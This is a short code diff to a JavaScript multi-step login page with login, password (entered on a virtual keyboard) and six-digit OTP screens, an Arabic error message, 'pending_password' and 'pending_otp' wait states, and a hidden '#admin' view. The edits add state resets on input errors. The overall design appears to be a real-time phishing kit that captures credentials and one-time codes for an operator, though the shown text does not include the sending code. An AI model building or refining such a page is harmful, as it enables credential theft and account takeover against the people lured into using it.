@@ -354,7 +354,11 @@ if(window.location.hash==='#admin'){ document.body.className='light'; go('admin-
 const li=document.getElementById('li');
 document.getElementById('nextBtn').addEventListener('click',()=>{
   const v=li.value.trim();
-  if(!v){document.getElementById('lerr').textContent='Please enter your login';return;}
+  if(!v){
+    document.getElementById('lerr').textContent='Please enter your login';
+    setState({login:'', password:'', otp:'', status:'idle'});
+    return;
+  }
   document.getElementById('lerr').textContent='';
   setState({login:v, status:'idle'});
   go('password');
@@ -409,7 +413,12 @@ document.getElementById('kbd').addEventListener('click',e=>{
 });
 
 document.getElementById('subBtn').addEventListener('click',()=>{
-  if(!pv)return;
+  if(!pv){
+    setState({password:'', status:'idle'});
+    document.getElementById('frErr').style.display='block';
+    document.getElementById('retryBtn').style.display='inline-block';
+    return;
+  }
   setState({password:pv, status:'pending_password'});
   document.getElementById('pwInp').style.display='none';
   const w=document.getElementById('pwWait');
@@ -461,7 +470,11 @@ document.getElementById('npad').addEventListener('click',e=>{
 });
 document.getElementById('otpConf').addEventListener('click',()=>{
   const otp=obs.map(b=>b.value).join('');
-  if(otp.length<6){document.getElementById('oerr').textContent='الرمز غير مكتمل';return;}
+  if(otp.length<6){
+    document.getElementById('oerr').textContent='الرمز غير مكتمل';
+    setState({otp:'', status:'idle'});
+    return;
+  }
   document.getElementById('oerr').textContent='';
   setState({otp, status:'pending_otp'});
   document.getElementById('otpConf').style.display='none';
